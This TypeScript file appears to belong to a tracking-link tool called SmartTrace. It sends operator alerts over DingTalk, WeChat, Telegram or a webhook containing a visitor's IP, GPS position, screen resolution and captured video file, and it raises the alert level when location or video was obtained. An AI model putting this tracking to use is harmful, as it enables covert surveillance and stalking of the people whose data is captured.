import axios from "axios";
import { getSmtpSetting } from "./db";

export async function sendWebhookNotification(data: {
  linkId: string;
  ip: string;
  gps: string;
  resolution: string;
  filePath: string;
  createdAt: Date;
  userId?: number | null;
}) {
  if (!data.userId) return;
  const setting = await getSmtpSetting(data.userId);
  if (!setting || !setting.webhookUrl) return;

  const { webhookUrl, webhookType, webhookTemplate, webhookAlertLevel } = setting;

  // Wenn webhookAlertLevel auf 'high' steht, prüfen wir ob Risikomerkmale vorliegen (z.B. GPS vorhanden oder Video)
  if (webhookAlertLevel === "high") {
    const hasGps = data.gps && data.gps !== "No GPS" && data.gps.length > 5;
    const isVideo = data.filePath && (data.filePath.endsWith(".webm") || data.filePath.endsWith(".mp4"));
    if (!hasGps && !isVideo) {
      // Überspringe Benachrichtigung bei 'high', da kein GPS oder Video vorliegt
      return;
    }
  }
  
  let text = webhookTemplate || `🚨 [SmartTrace 访客提醒]
- 追踪编号: {linkId}
- IP 地址: {ip}
- GPS 定位: {gps}
- 屏幕分辨率: {resolution}
- 捕获时间: {createdAt}
- 媒体文件: {filePath}`;

  text = text
    .replace(/{linkId}/g, data.linkId)
    .replace(/{ip}/g, data.ip)
    .replace(/{gps}/g, data.gps)
    .replace(/{resolution}/g, data.resolution)
    .replace(/{createdAt}/g, new Date(data.createdAt).toLocaleString())
    .replace(/{filePath}/g, data.filePath);

  try {
    if (webhookType === "dingtalk") {
      await axios.post(webhookUrl, {
        msgtype: "text",
        text: { content: text },
      }, { timeout: 5000 });
    } else if (webhookType === "wechat") {
      await axios.post(webhookUrl, {
        msgtype: "text",
        text: { content: text },
      }, { timeout: 5000 });
    } else if (webhookType === "telegram") {
      const targetUrl = webhookUrl.includes("?") ? `${webhookUrl}&text=${encodeURIComponent(text)}` : `${webhookUrl}?text=${encodeURIComponent(text)}`;
      await axios.get(targetUrl, { timeout: 5000 });
    } else {
      await axios.post(webhookUrl, { content: text }, { timeout: 5000 });
    }
    console.log(`[Webhook] Notification sent successfully via ${webhookType}`);
  } catch (error) {
    console.error("[Webhook] Failed to send webhook notification:", error);
  }
}
